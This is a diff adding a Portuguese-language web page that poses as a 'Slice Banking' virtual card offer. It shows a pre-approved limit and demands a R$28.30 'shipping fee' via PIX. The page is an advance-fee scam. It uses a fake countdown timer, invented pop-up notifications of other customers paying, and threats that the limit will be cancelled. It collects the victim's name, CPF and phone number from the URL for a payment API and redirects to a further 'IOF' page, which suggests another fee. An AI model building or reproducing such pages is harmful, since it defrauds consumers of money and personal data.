@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="utf-8" />
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport" />
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" rel="stylesheet" />
+    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;700&display=swap" rel="stylesheet" />
+    <title>Cartão Virtual</title>
+    <!-- Utmify utms capture -->
+    <script async="" data-utmify-prevent-subids="" defer="" src="https://cdn.utmify.com.br/scripts/utms/latest.js"></script>
+    <!-- Utmify pixel -->
+    <script>
+        window.pixelId = "67fc6e7f5a1d50ce1722301e";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+    <!-- Utmify end -->
+    <style>
+        body { margin: 0; font-family: 'Sora', sans-serif; background-color: #ffffff; min-height: 100vh; display: flex; flex-direction: column; }
+        .header { display: flex; align-items: center; padding: 10px; border-bottom: 1px solid #890dbd; background-color: #890dbd; }
+        .header img { width: 100px; padding: 5px; }
+        .logo { width: 125px; padding: 10px; margin-left: 20px; }
+        .content { flex: 1; padding: 20px; max-width: 600px; margin: 0 auto; width: 100%; box-sizing: border-box; }
+        .limite-text { text-align: center; font-size: 18px; font-weight: bold; margin-top: 10px; }
+        .limite-valor { text-align: center; font-size: 36px; font-weight: bold; color: #e101f5; margin-bottom: 20px; }
+        .card { background: linear-gradient(45deg, #e6b800, #fff159); border-radius: 15px; padding: 20px; height: 165px; position: relative; margin-bottom: 30px; }
+        .button { background: #890dbd; color: rgb(255, 255, 255); padding: 15px 30px; border: none; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; width: 100%; text-decoration: none; display: inline-block; text-align: center; box-sizing: border-box; margin-top: 20px; }
+        .button:hover { background: #e101f5; }
+
+        /* ESTILOS DA MODAL PIX */
+        .pix-modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.7); display: none; justify-content: center; align-items: center; z-index: 2000; }
+        .pix-modal-content { background: white; padding: 30px; border-radius: 15px; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3); position: relative; }
+        .pix-modal-content h2 { margin-top: 0; color: #333; }
+        .pix-modal-close { position: absolute; top: 15px; right: 15px; font-size: 24px; color: #aaa; cursor: pointer; }
+        #pix-qrcode-img { max-width: 200px; width: 100%; margin: 15px auto; border: 5px solid #eee; border-radius: 8px; }
+        #pix-copia-cola { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 5px; font-size: 12px; text-align: center; margin-bottom: 10px; box-sizing: border-box; }
+        .btn-copiar { background: #28a745; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; width: 100%; }
+        .btn-copiar:hover { background: #218838; }
+        .status-aguardando { margin-top: 20px; font-size: 16px; color: #ff9800; }
+    </style>
+</head>
+<body>
+    <!-- MODAL PARA PAGAMENTO PIX (QR CODE) -->
+    <div id="pix-modal" class="pix-modal-overlay">
+        <div class="pix-modal-content">
+            <span class="pix-modal-close" onclick="fecharModalPix()">×</span>
+            <div id="pix-loading">
+                <h2>Gerando PIX...</h2>
+                <i class="fas fa-spinner fa-spin fa-3x" style="color: #890dbd;"></i>
+            </div>
+            <div id="pix-gerado" style="display: none;">
+                 <h2>Pague com PIX para liberar seu cartão</h2>
+                 <p>Abra o app do seu banco e escaneie o código abaixo:</p>
+                 <img id="pix-qrcode-img" src="" alt="QR Code PIX">
+                 <p>Ou copie o código e pague no seu app:</p>
+                 <input type="text" id="pix-copia-cola" readonly>
+                 <button class="btn-copiar" onclick="copiarPixCode()">
+                    <i class="fas fa-copy"></i> Copiar Código PIX
+                 </button>
+                 <div class="status-aguardando">
+                     <i class="fas fa-hourglass-half fa-spin"></i> Aguardando Pagamento...
+                 </div>
+                 <p style="font-size:12px; color: #666; margin-top: 15px;">O cartão virtual será liberado assim que o pagamento for confirmado.</p>
+            </div>
+            <div id="pix-aprovado" style="display: none;">
+                 <i class="fas fa-check-circle fa-4x" style="color: #28a745; margin-bottom: 20px;"></i>
+                 <h2 style="color: #28a745;">Pagamento Aprovado!</h2>
+                 <p>Seu cartão virtual será ativado e enviado em instantes. Você será redirecionado em breve.</p>
+            </div>
+        </div>
+    </div>
+
+
+    <div class="header">
+        <img alt="Logo Slice Banking" class="logo" src="img/Bf6Dpoa.png" />
+    </div>
+    <div class="content">
+        <div class="limite-text">Seu Limite Disponível</div>
+        <div class="limite-valor">R$ 5.800</div>
+        <div class="card" style="background: linear-gradient(135deg, #005b03, #65c732, #0288d1); box-shadow: 0 10px 20px rgba(0,0,0,0.2); border: 1px solid rgba(255,255,255,0.1); overflow: hidden; position: relative;">
+            <div style="position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent); animation: shine 3s infinite; z-index: 1;"></div>
+            <style> @keyframes shine { 0% { left: -100%; } 20% { left: 100%; } 100% { left: 100%; } } </style>
+            <div style="position: absolute; top: 20px; left: 0; width: 100%; height: 50px; background-color: #5a5a5a; z-index: 2;"></div>
+            <div style="position: absolute; top: 47.5%; left: 20px; transform: translateY(-50%);">
+                <div style="color: rgb(255, 255, 255); font-size: 24px; letter-spacing: 4px; font-family: 'Sora', sans-serif; text-shadow: 0 2px 4px rgba(0,0,0,0.2);">4532 •••• •••• ••••</div>
+            </div>
+            <div style="position: absolute; top: 125px; left: 0; width: 100%; display: flex; justify-content: space-between; z-index: 2; padding: 0 20px; box-sizing: border-box;">
+                <div style="display: flex; flex-direction: column;">
+                    <span style="color: white; font-size: 10px; margin-bottom: 5px; text-shadow: 0 1px 2px rgba(0,0,0,0.3);">VALIDADE</span>
+                    <span style="color: white; font-size: 14px; font-weight: bold; text-shadow: 0 1px 2px rgba(0,0,0,0.3);">12/28</span>
+                </div>
+            </div>
+            <div style="position: absolute; top: 125px; right: 20px; padding-right: 5px; width: calc(100% - 120px); height: 40px; background-color: rgba(255,255,255,0.9); border-radius: 4px; z-index: 2; display: flex; align-items: center;">
+                <div style="width: 80%; height: 20px; margin-left: 10px; background-image: repeating-linear-gradient(45deg, #ccc, #ccc 5px, #eee 5px, #eee 10px);"></div>
+                <div style="width: 50px; height: 30px; margin-left: 5px; background-color: white; border-radius: 3px; display: flex; justify-content: center; align-items: center;">
+                    <span style="color: #333; font-size: 14px; font-weight: bold;">719</span>
+                </div>
+            </div>
+            <div style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-image: repeating-linear-gradient(45deg, rgba(255,255,255,0.03) 0px, rgba(255,255,255,0.03) 2px, transparent 2px, transparent 4px); pointer-events: none; z-index: 0;"></div>
+            <script> const cardColor = JSON.parse(localStorage.getItem('cardColor')); if (cardColor) { document.querySelector('.card').style.background = `linear-gradient(45deg, ${cardColor.color1}, ${cardColor.color2})`; } </script>
+        </div>
+        <div style="text-align: center; margin-top: 30px;">
+            <h2 style="font-size: 18px; margin-bottom: 5px;">Finalize o envio do seu cartão</h2>
+            <p style="color: #666; font-size: 14px; margin-bottom: 25px;">Pague o frete para receber o cartão físico e ativar o cartão virtual agora mesmo.</p>
+            <div style="text-align: center; font-size: 28px; font-weight: bold; color: #e101f5;">R$ 28,30</div>
+            <button id="main-pay-button" class="button" onclick="gerarPagamentoPix()">Pagar Frete com PIX</button>
+            <div style="text-align: center; margin-top: 15px;">
+                <i class="fas fa-lock" style="font-size: 20px; color: #28a745; vertical-align: middle;"></i>
+                <span style="color: #28a745; font-size: 14px; margin-left: 5px;">Pagamento 100% seguro</span>
+            </div>
+            <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; text-align: left; margin-top: 20px;">
+                <div style="margin-bottom: 15px;"><div style="font-weight: bold; margin-bottom: 5px;">Método de Envio</div><div>SEDEX</div></div>
+                <div style="margin-bottom: 15px;"><div style="font-weight: bold; margin-bottom: 5px;">Prazo de Entrega</div><div>1 dia útil</div></div>
+                <div style="margin-bottom: 15px;"><div style="font-weight: bold; margin-bottom: 5px;">Pagamento em Até 10 Minutos</div><div>Realize o pagamento do frete em até 10 minutos para ativar o cartão virtual.</div></div>
+                <div style="margin-bottom: 15px;"><div style="font-weight: bold; margin-bottom: 5px;">Ativação Após Pagamento</div><div>O cartão virtual será ativado automaticamente após a aprovação do pagamento.</div></div>
+            </div>
+            <div style="background: #ffe6e6; border-radius: 8px; padding: 15px; margin-top: 20px; text-align: center;">
+                <i class="fas fa-clock" style="color: #dc3545; margin-right: 5px;"></i>
+                <span id="timer" style="color: #dc3545; font-weight: bold;">10:00</span>
+                <br />
+                <span style="color: #dc3545; font-size: 12px;">Essa oportunidade é válida apenas hoje! O não pagamento fará que seu cartão seja cancelado</span>
+                <script>
+                    function startTimer(duration, display) {
+                        var timer = duration, minutes, seconds;
+                        var countdown = setInterval(function () {
+                            minutes = parseInt(timer / 60, 10);
+                            seconds = parseInt(timer % 60, 10);
+                            minutes = minutes < 10 ? "0" + minutes : minutes;
+                            seconds = seconds < 10 ? "0" + seconds : seconds;
+                            display.textContent = minutes + ":" + seconds;
+                            if (--timer < 0) { clearInterval(countdown); display.textContent = "EXPIRADO"; }
+                        }, 1000);
+                    }
+                    window.onload = function () { var tenMinutes = 60 * 10, display = document.querySelector('#timer'); startTimer(tenMinutes, display); };
+                </script>
+            </div>
+        </div>
+    </div>
+    <div class="faq-container" style="margin: 20px auto; max-width: 600px; padding: 0 20px;">
+        <h2 style="text-align: center; color: #333; margin-bottom: 20px; font-size: 18px; border-top: 1px solid #ddd; padding-top: 50px;">Perguntas Frequentes</h2>
+        <div style="border-bottom: 1px solid #ddd; margin-bottom: 10px;"><div onclick="toggleFaq(this)" style="padding: 15px 0; cursor: pointer; display: flex; justify-content: space-between; align-items: center;"><span style="font-weight: bold; color: #333;">Como funciona o cartão virtual?</span><i class="fas fa-chevron-down" style="color: #666; transition: transform 0.3s;"></i></div><div style="display: none; padding: 0 0 15px; color: #666; line-height: 1.5;">Você receberá dois cartões: um virtual para uso imediato em compras online com total segurança, e um físico que será entregue em sua casa. O cartão virtual é ativado assim que confirmamos o pagamento do frete, e o físico chega pelos Correios.</div></div>
+        <div style="border-bottom: 1px solid #ddd; margin-bottom: 10px;"><div onclick="toggleFaq(this)" style="padding: 15px 0; cursor: pointer; display: flex; justify-content: space-between; align-items: center;"><span style="font-weight: bold; color: #333;">Por que eu preciso pagar o frete?</span><i class="fas fa-chevron-down" style="color: #666; transition: transform 0.3s;"></i></div><div style="display: none; padding: 0 0 15px; color: #666; line-height: 1.5;">O pagamento do frete é obrigatório para garantir a entrega segura do seu cartão físico e a ativação imediata do seu cartão virtual. Sem ele, não é possível concluir o envio.</div></div>
+        <div style="border-bottom: 1px solid #ddd; margin-bottom: 10px;"><div onclick="toggleFaq(this)" style="padding: 15px 0; cursor: pointer; display: flex; justify-content: space-between; align-items: center;"><span style="font-weight: bold; color: #333;">O que acontece depois que eu pagar o frete?</span><i class="fas fa-chevron-down" style="color: #666; transition: transform 0.3s;"></i></div><div style="display: none; padding: 0 0 15px; color: #666; line-height: 1.5;">• Seu cartão virtual será enviado por WhatsApp • Você recebe acesso ao aplicativo com seu cartão<br />• Um gerente exclusivo entra em contato via WhatsApp<br />• Enviamos o código de rastreamento do cartão físico</div></div>
+        <div style="border-bottom: 1px solid #ddd; margin-bottom: 10px;"><div onclick="toggleFaq(this)" style="padding: 15px 0; cursor: pointer; display: flex; justify-content: space-between; align-items: center;"><span style="font-weight: bold; color: #333;">E se eu pagar o frete e o cartão não chegar?</span><i class="fas fa-chevron-down" style="color: #666; transition: transform 0.3s;"></i></div><div style="display: none; padding: 0 0 15px; color: #666; line-height: 1.5;">Garantimos a entrega do seu cartão! Caso ocorra qualquer problema, você pode solicitar o reembolso do valor do frete através do nosso SAC. Além disso, todo o processo é monitorado e você recebe atualizações por WhatsApp.</div></div>
+        <div style="border-bottom: 1px solid #ddd; margin-bottom: 10px;"><div onclick="toggleFaq(this)" style="padding: 15px 0; cursor: pointer; display: flex; justify-content: space-between; align-items: center;"><span style="font-weight: bold; color: #333;">E se eu não pagar o frete agora?</span><i class="fas fa-chevron-down" style="color: #666; transition: transform 0.3s;"></i></div><div style="display: none; padding: 0 0 15px; color: #666; line-height: 1.5;">Além de não receber o cartão, você perderá o limite já aprovado e não poderá fazer outra solicitação. Essa é uma oportunidade única, então não deixe para depois!</div></div>
+        <div style="border-bottom: 1px solid #ddd; margin-bottom: 10px;"><div onclick="toggleFaq(this)" style="padding: 15px 0; cursor: pointer; display: flex; justify-content: space-between; align-items: center;"><span style="font-weight: bold; color: #333;">Já paguei o frete. Preciso fazer mais alguma coisa?</span><i class="fas fa-chevron-down" style="color: #666; transition: transform 0.3s;"></i></div><div style="display: none; padding: 0 0 15px; color: #666; line-height: 1.5;">Não. Após o pagamento, cuidamos de tudo. O envio do cartão é iniciado em até 2 horas, e você receberá o link com o código de rastreamento para acompanhar a entrega. É só aguardar!</div></div>
+        <script>
+            function toggleFaq(element) { const content = element.nextElementSibling; const icon = element.querySelector('.fa-chevron-down'); if (content.style.display === "none") { content.style.display = "block"; icon.style.transform = "rotate(180deg)"; } else { content.style.display = "none"; icon.style.transform = "rotate(0deg)"; } }
+        </script>
+        <footer style="padding: 10px 15px; text-align: center; margin-top: 50px; background-color: #f9f9f9; border-top: 1px solid #eaeaea; font-family: 'Sora', sans-serif;"><div style="max-width: 600px; margin: 0 auto;"><p style="color: #777; font-size: 10px; margin-bottom: 5px; line-height: 1.2;">Slice Banking Brasil LTDA | CNPJ: 98.365.409/0001-06</p><p style="color: #777; font-size: 10px; margin-bottom: 5px; line-height: 1.2;">Av. das Nações Unidas, 3000 - Bonfim, Osasco - SP, 06233-903</p><p style="color: #999; font-size: 9px; margin-top: 5px;">© 2025 - Todos os direitos reservados</p></div></footer>
+        <style>.notification {position: fixed; left: 20px; bottom: 20px; background: white; box-shadow: 0 4px 12px rgba(0,0,0,0.15); border-radius: 8px; padding: 12px 20px; display: flex; align-items: center; gap: 10px; transform: translateY(100px); opacity: 0; transition: all 0.3s ease; z-index: 1000; } .notification.show { transform: translateY(0); opacity: 1; } .notification i { color: #fff159; font-size: 20px; }</style>
+        <script>
+            const nomes = ["Ana", "João", "Bianca", "Leonardo", "Rui", "Gustavo", "Gil", "Lia", "Caio", "Thiago", "Theo", "Maria"];
+            const sobrenomes = ["Silva", "Lima", "Costa", "Dias", "Melo", "Santos", "Reis", "Luz", "Rocha", "Cruz", "Lopes", "Gomes"];
+            const acoes = ["recebeu o cartão hoje!", "pagou a taxa de envio!", "ativou o cartão virtual!"];
+            function mostrarNotificacao() { const nome = nomes[Math.floor(Math.random() * nomes.length)]; const sobrenome = sobrenomes[Math.floor(Math.random() * sobrenomes.length)]; const acao = acoes[Math.floor(Math.random() * acoes.length)]; const notification = document.createElement('div'); notification.className = 'notification'; notification.innerHTML = `<i class="fas fa-bell"></i><span style="font-size: 14px;">${nome} ${sobrenome} ${acao}</span>`; document.body.appendChild(notification); setTimeout(() => { notification.classList.add('show'); }, 100); setTimeout(() => { notification.classList.remove('show'); setTimeout(() => { notification.remove(); }, 300); }, 3000); }
+            setInterval(mostrarNotificacao, 5000); setTimeout(mostrarNotificacao, 1000);
+        </script>
+        <script>
+            function getUrlParams() { const params = {}; const queryString = window.location.search; const urlParams = new URLSearchParams(queryString); for (const [key, value] of urlParams) { params[key] = value; } return params; }
+            function buildUrlWithParams(baseUrl) { const params = getUrlParams(); const url = new URL(baseUrl, window.location.href); Object.keys(params).forEach(key => { url.searchParams.append(key, params[key]); }); return url.toString(); }
+        </script>
+    </div>
+
+    <!-- =================================================================== -->
+    <!-- SCRIPT DA LÓGICA PIX - VERSÃO CORRIGIDA -->
+    <!-- =================================================================== -->
+    <script>
+        // --- CONFIGURAÇÕES DA API ---
+        const apiKey = 'f4CE9pA80c4hb1K-hB_NRw3gotBtZHcdgNf6eeinDqu4LCCgWsGvuX3rALbcKQMraTKzCtd96AT3VOySlsN-oQ'; // <-- CONFIGURE AQUI sua chave da API
+        const apiUrl = 'https://app.duttyonpay.com.br/api-pix/';
+        const redirectUrlAposPagamento = '../iof'; // <-- CONFIGURE AQUI a URL de sucesso
+
+        let intervaloVerificacao;
+
+        // --- ELEMENTOS DA MODAL E BOTÃO ---
+        const pixModal = document.getElementById('pix-modal');
+        const pixLoading = document.getElementById('pix-loading');
+        const pixGerado = document.getElementById('pix-gerado');
+        const pixAprovado = document.getElementById('pix-aprovado');
+        const mainPayButton = document.getElementById('main-pay-button');
+        
+        // --- FUNÇÕES DE CONTROLE DA MODAL ---
+        function fecharModalPix() {
+            pixModal.style.display = 'none';
+            if (intervaloVerificacao) {
+                clearInterval(intervaloVerificacao);
+            }
+            mainPayButton.disabled = false;
+            mainPayButton.innerHTML = 'Pagar Frete com PIX';
+        }
+
+        function copiarPixCode() {
+            const input = document.getElementById('pix-copia-cola');
+            input.select();
+            input.setSelectionRange(0, 99999);
+            navigator.clipboard.writeText(input.value).then(() => {
+                const btn = document.querySelector('.btn-copiar');
+                btn.innerHTML = '<i class="fas fa-check"></i> Copiado!';
+                setTimeout(() => { btn.innerHTML = '<i class="fas fa-copy"></i> Copiar Código PIX'; }, 2000);
+            });
+        }
+        
+        // --- FUNÇÃO PRINCIPAL: GERAR PIX A PARTIR DA URL ---
+        async function gerarPagamentoPix() {
+            mainPayButton.disabled = true;
+            mainPayButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processando...';
+
+            // 1. Capturar dados da URL
+            const params = new URLSearchParams(window.location.search);
+            const name = params.get('name')?.replace(/\+/g, ' ');
+            // CORREÇÃO: Renomear a variável para não conflitar com o objeto 'document' global
+            const customerDocument = params.get('document')?.replace(/\D/g, ''); 
+            const telephone = params.get('telephone')?.replace(/\D/g, '');
+
+            // 2. Validar se os dados existem
+            if (!name || !customerDocument || !telephone) {
+                alert('Erro: Dados do cliente (nome, documento, telefone) não foram encontrados na URL. Verifique o link e tente novamente.');
+                mainPayButton.disabled = false;
+                mainPayButton.innerHTML = 'Pagar Frete com PIX';
+                return;
+            }
+
+            // 3. Criar e-mail placeholder
+            const email = `${customerDocument}@email.placeholder.com`;
+
+            // 4. Abrir modal em modo "loading"
+            pixModal.style.display = 'flex';
+            pixLoading.style.display = 'block';
+            pixGerado.style.display = 'none';
+            pixAprovado.style.display = 'none';
+
+            // 5. Montar o corpo da requisição
+            const valorEmCentavos = 2830;
+            const body = {
+                amount: valorEmCentavos,
+                description: "Pagamento Frete Cartão Virtual",
+                // CORREÇÃO: Usar a nova variável 'customerDocument' para o valor da chave 'document'
+                customer: { name, document: customerDocument, email, phone: telephone },
+                item: { title: "Taxa de Envio SEDEX", price: valorEmCentavos, quantity: 1 },
+                paymentMethod: "PIX",
+                utm: params.toString() || undefined
+            };
+
+            // 6. Fazer a chamada para a API
+            try {
+                const response = await fetch(`${apiUrl}${apiKey}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(body)
+                });
+                
+                const data = await response.json();
+                if (!response.ok) { throw new Error(data.error || 'Ocorreu um erro ao gerar o PIX.'); }
+                
+                // Sucesso: exibe o QR Code
+                document.getElementById('pix-qrcode-img').src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(data.pixCode)}`;
+                document.getElementById('pix-copia-cola').value = data.pixCode;
+                
+                pixLoading.style.display = 'none';
+                pixGerado.style.display = 'block';
+
+                // Inicia o monitoramento
+                monitorarPagamento(data.transactionId);
+
+            } catch (error) {
+                console.error('Erro ao gerar PIX:', error);
+                alert(`Erro: ${error.message}`);
+                fecharModalPix();
+            }
+        }
+        
+        // --- FUNÇÃO DE MONITORAMENTO (inalterada) ---
+        function monitorarPagamento(transactionId) {
+            if (intervaloVerificacao) { clearInterval(intervaloVerificacao); }
+            intervaloVerificacao = setInterval(async () => {
+                try {
+                    const response = await fetch(`${apiUrl}${apiKey}?transactionId=${transactionId}`);
+                    const data = await response.json();
+                    if (!response.ok) { throw new Error(data.error || 'Erro ao verificar status.'); }
+
+                    if (data.status === 'COMPLETED') {
+                        clearInterval(intervaloVerificacao);
+                        pixGerado.style.display = 'none';
+                        pixAprovado.style.display = 'block';
+                        setTimeout(() => {
+                           window.location.href = buildUrlWithParams(redirectUrlAposPagamento);
+                        }, 3000);
+                    }
+                } catch (error) {
+                    console.error('Erro no monitoramento:', error);
+                    clearInterval(intervaloVerificacao);
+                }
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
